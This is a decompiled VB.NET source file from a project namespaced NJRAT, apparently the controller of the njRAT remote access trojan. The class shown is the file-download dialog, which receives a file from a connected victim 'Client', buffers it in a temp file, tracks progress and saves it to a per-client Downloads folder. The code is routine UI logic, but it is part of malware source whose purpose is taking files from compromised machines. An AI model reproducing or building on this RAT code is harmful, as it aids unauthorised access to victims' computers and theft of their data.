Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x02000012 RID: 18
	<DesignerGenerated()>
	Public Partial Class DW
		Inherits Form

		' Token: 0x17000062 RID: 98
		' (get) Token: 0x06000111 RID: 273 RVA: 0x0000B1E1 File Offset: 0x000093E1
		' (set) Token: 0x06000112 RID: 274 RVA: 0x0000B1EB File Offset: 0x000093EB
		Friend Overridable Property ProgressBar1 As ProgressBar

		' Token: 0x17000063 RID: 99
		' (get) Token: 0x06000113 RID: 275 RVA: 0x0000B1F4 File Offset: 0x000093F4
		' (set) Token: 0x06000114 RID: 276 RVA: 0x0000B1FE File Offset: 0x000093FE
		Friend Overridable Property Lv1 As GClass9

		' Token: 0x17000064 RID: 100
		' (get) Token: 0x06000115 RID: 277 RVA: 0x0000B207 File Offset: 0x00009407
		' (set) Token: 0x06000116 RID: 278 RVA: 0x0000B214 File Offset: 0x00009414
		Friend Overridable Property Button1 As Button
			<CompilerGenerated()>
			Get
				Return Me._Button1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				Dim button As Button = Me._Button1
				If button IsNot Nothing Then
					RemoveHandler button.Click, value2
				End If
				Me._Button1 = value
				button = Me._Button1
				If button IsNot Nothing Then
					AddHandler button.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000065 RID: 101
		' (get) Token: 0x06000117 RID: 279 RVA: 0x0000B257 File Offset: 0x00009457
		' (set) Token: 0x06000118 RID: 280 RVA: 0x0000B264 File Offset: 0x00009464
		Friend Overridable Property Timer1 As Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000066 RID: 102
		' (get) Token: 0x06000119 RID: 281 RVA: 0x0000B2A7 File Offset: 0x000094A7
		' (set) Token: 0x0600011A RID: 282 RVA: 0x0000B2B1 File Offset: 0x000094B1
		Friend Overridable Property ColumnHeader1 As ColumnHeader

		' Token: 0x17000067 RID: 103
		' (get) Token: 0x0600011B RID: 283 RVA: 0x0000B2BA File Offset: 0x000094BA
		' (set) Token: 0x0600011C RID: 284 RVA: 0x0000B2C4 File Offset: 0x000094C4
		Friend Overridable Property ColumnHeader2 As ColumnHeader

		' Token: 0x0600011D RID: 285 RVA: 0x0000B2CD File Offset: 0x000094CD
		Public Sub New()
			AddHandler MyBase.FormClosing, AddressOf Me.DW_FormClosing
			AddHandler MyBase.Load, AddressOf Me.DW_Load
			Me.os = 0
			Me.InitializeComponent()
		End Sub

		' Token: 0x0600011E RID: 286 RVA: 0x0000B30C File Offset: 0x0000950C
		Private Sub DW_FormClosing(sender As Object, e As FormClosingEventArgs)
			Try
				Me.FS.Close()
			Catch ex As Exception
			End Try
			Try
				Me.FS.Dispose()
			Catch ex2 As Exception
			End Try
			Try
				File.Delete(Me.tmp)
			Catch ex3 As Exception
			End Try
			Me.Button1.Enabled = False
			Me.c.CN = False
		End Sub

		' Token: 0x0600011F RID: 287 RVA: 0x0000B3B8 File Offset: 0x000095B8
		Private Sub DW_Load(sender As Object, e As EventArgs)
			Me.Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Class7.smethod_1(Me.osk.L)), " - ")), Class6.smethod_16(Me.FN))))
			Me.ProgressBar1.Maximum = Me.SZ
			Me.folder = Me.osk.Folder + "Downloads\"
			Dim flag As Boolean = Not Directory.Exists(Me.folder)
			If flag Then
				Directory.CreateDirectory(Me.folder)
			End If
			Dim ptr As String = Me.folder
			Me.folder = ptr + New FileInfo(Class6.smethod_16(Me.FN)).Name
			Me.Lv1.Items(0).SubItems(0).Text = New FileInfo(Class6.smethod_16(Me.FN)).Name
			Me.Lv1.Items(1).SubItems(0).Text = Class6.smethod_17(CLng(Me.SZ))
			Do
				Me.tmp = Interaction.Environ("temp") + "\njfm_" + Class6.smethod_6(10)
			Loop While File.Exists(Me.tmp)
			Me.FS = New FileStream(Me.tmp, FileMode.Append)
			Me.Lv1.Items(2).SubItems(0).Text = Class6.smethod_17(CLng((Me.ProgressBar1.Value - Me.os)))
			Me.os = Me.ProgressBar1.Value
			Me.Lv1.Items(3).SubItems(0).Text = Class6.smethod_17(CLng(Me.ProgressBar1.Value))
			Me.Lv1.method_3()
			Me.Timer1.Enabled = True
		End Sub

		' Token: 0x06000120 RID: 288 RVA: 0x0000B5C0 File Offset: 0x000097C0
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Me.Lv1.Items(2).SubItems(1).Text = Class6.smethod_17(CLng((Me.ProgressBar1.Value - Me.os)))
				Me.os = Me.ProgressBar1.Value
				Me.Lv1.Items(3).SubItems(1).Text = Class6.smethod_17(CLng(Me.ProgressBar1.Value))
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000121 RID: 289 RVA: 0x0000B670 File Offset: 0x00009870
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.Button1.Text, "Stop", False) = 0
			If flag Then
				Me.FS.Close()
				Me.FS.Dispose()
				File.Delete(Me.tmp)
				Me.Button1.Enabled = False
				Me.c.CN = False
				MyBase.Close()
			Else
				Me.FS.Close()
				Me.FS.Dispose()
				File.Move(Me.tmp, Me.folder)
			End If
		End Sub

		' Token: 0x04000093 RID: 147
		Public c As Client

		' Token: 0x04000094 RID: 148
		Public FN As String

		' Token: 0x04000095 RID: 149
		Public folder As String

		' Token: 0x04000096 RID: 150
		Public FS As FileStream

		' Token: 0x04000097 RID: 151
		Public os As Integer

		' Token: 0x04000098 RID: 152
		Public osk As Client

		' Token: 0x04000099 RID: 153
		Public SZ As Integer

		' Token: 0x0400009A RID: 154
		Public tmp As String
	End Class
End Namespace
